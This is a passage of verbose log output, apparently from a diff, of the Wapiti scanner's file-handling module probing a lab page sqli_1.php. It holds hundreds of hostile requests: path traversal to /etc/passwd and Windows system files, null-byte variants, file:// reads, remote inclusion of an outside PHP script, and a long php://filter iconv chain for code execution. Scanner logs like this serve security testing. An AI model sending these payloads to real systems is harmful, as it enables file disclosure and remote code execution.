+2024-03-20 16:41:20.957 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:41:20.969 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:41:20.983 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:41:20.998 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.011 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.024 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.038 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.051 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.065 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.077 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.090 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.104 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1162.UTF32%7Cconvert.iconv.L4.T.61%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.R9.ISO6937%7Cconvert.iconv.OSF00010100.UHC%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.863.UTF-16%7Cconvert.iconv.ISO6937.UTF16LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP-AR.UTF16%7Cconvert.iconv.8859_4.BIG5HKSCS%7Cconvert.iconv.MSCP1361.UTF-32LE%7Cconvert.iconv.IBM932.UCS-2BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L6.UNICODE%7Cconvert.iconv.CP1282.ISO-IR-90%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.BIG5HKSCS.UTF16%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF16%7Cconvert.iconv.ISO6937.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CP1046.UTF32%7Cconvert.iconv.L6.UCS-2%7Cconvert.iconv.UTF-16LE.T.61-8BIT%7Cconvert.iconv.865.UCS-4LE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.MAC.UTF16%7Cconvert.iconv.L8.UTF16BE%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSIBM1161.UNICODE%7Cconvert.iconv.ISO-IR-156.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.INIS.UTF16%7Cconvert.iconv.CSIBM1133.IBM943%7Cconvert.iconv.IBM932.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.base64-decode%2Fresource%3Dphp%3A%2F%2Ftemp (0)
+2024-03-20 16:41:21.119 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:41:21.132 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:41:21.146 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:41:21.158 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:41:21.170 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.182 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.194 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.209 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.221 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.237 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.252 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.267 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.283 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:41:21.295 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (0)
+2024-03-20 16:41:21.310 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:41:21.325 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:41:21.341 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.354 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.369 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.382 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.394 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.409 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.424 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.442 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=search%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.457 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=file%3A%2F%2F%2Fetc%2Fpasswd (0)
+2024-03-20 16:41:21.468 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=file%3A%2F%2FC%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (0)
+2024-03-20 16:41:21.478 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd (0)
+2024-03-20 16:41:21.489 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fpasswd%00 (0)
+2024-03-20 16:41:21.499 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.509 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.519 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (0)
+2024-03-20 16:41:21.531 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2F....%2F%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (0)
+2024-03-20 16:41:21.544 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=sqli_1.php (0)
+2024-03-20 16:41:21.559 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=sqli_1.php%00 (0)
+2024-03-20 16:41:21.574 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=fuzz&action=sqli_1.php%3A%3A%24DATA (0)
+2024-03-20 16:41:21.600 | INFO     | wapitiCore.controller.wapiti:attack:501 - [+] GET http://web/sqli_1.php?title=default&action=search (1)
+2024-03-20 16:41:21.604 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php (1)
+2024-03-20 16:41:21.619 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=https%3A%2F%2Fwapiti3.ovh%2F%2Fe.php%00 (1)
+2024-03-20 16:41:21.633 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=%2Fetc%2Fpasswd (1)
+2024-03-20 16:41:21.644 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=%2Fetc%2Fpasswd%00 (1)
+2024-03-20 16:41:21.658 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=%2Fetc%2Fservices (1)
+2024-03-20 16:41:21.669 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:21.682 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices (1)
+2024-03-20 16:41:21.693 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%00 (1)
+2024-03-20 16:41:21.706 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=C%3A%5CWindows%5CSystem32%5Cdrivers%5Cetc%5Cservices%3A%3A%24DATA (1)
+2024-03-20 16:41:21.717 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
+2024-03-20 16:41:21.734 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:21.750 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=C%3A%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%3A%3A%24DATA (1)
+2024-03-20 16:41:21.765 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Flib%2F (1)
+2024-03-20 16:41:21.779 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fwindows%2F (1)
+2024-03-20 16:41:21.795 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
+2024-03-20 16:41:21.812 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd (1)
+2024-03-20 16:41:21.830 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
+2024-03-20 16:41:21.848 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd%00 (1)
+2024-03-20 16:41:21.866 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
+2024-03-20 16:41:21.881 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices (1)
+2024-03-20 16:41:21.897 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:21.919 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:21.940 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
+2024-03-20 16:41:21.954 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices (1)
+2024-03-20 16:41:21.972 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:21.989 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2FWindows%2FSystem32%2Fdrivers%2Fetc%2Fservices%00 (1)
+2024-03-20 16:41:22.003 | VERBOSE  | wapitiCore.attack.mod_file:attack:163 - [¨] GET http://web/sqli_1.php?title=default&action=php%3A%2F%2Ffilter%2Fconvert.iconv.UTF8.CSISO2022KR%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM921.NAPLPS%7Cconvert.iconv.855.CP936%7Cconvert.iconv.IBM-932.UTF-8%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.SE2.UTF-16%7Cconvert.iconv.CSIBM1161.IBM-932%7Cconvert.iconv.MS932.MS936%7Cconvert.iconv.BIG5.JOHAB%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM869.UTF16%7Cconvert.iconv.L3.CSISO90%7Cconvert.iconv.UCS2.UTF-8%7Cconvert.iconv.CSISOLATIN6.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.8859_3.UTF16%7Cconvert.iconv.863.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.851.UTF-16%7Cconvert.iconv.L1.T.618BIT%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.CSA_T500.UTF-32%7Cconvert.iconv.CP857.ISO-2022-JP-3%7Cconvert.iconv.ISO2022JP2.CP775%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.IBM891.CSUNICODE%7Cconvert.iconv.ISO8859-14.ISO6937%7Cconvert.iconv.BIG-FIVE.UCS-4%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cconvert.iconv.L5.UTF-32%7Cconvert.iconv.ISO88594.GB13000%7Cconvert.iconv.BIG5.SHIFT_JISX0213%7Cconvert.base64-decode%7Cconvert.base64-encode%7Cconvert.iconv.UTF8.UTF7%7Cco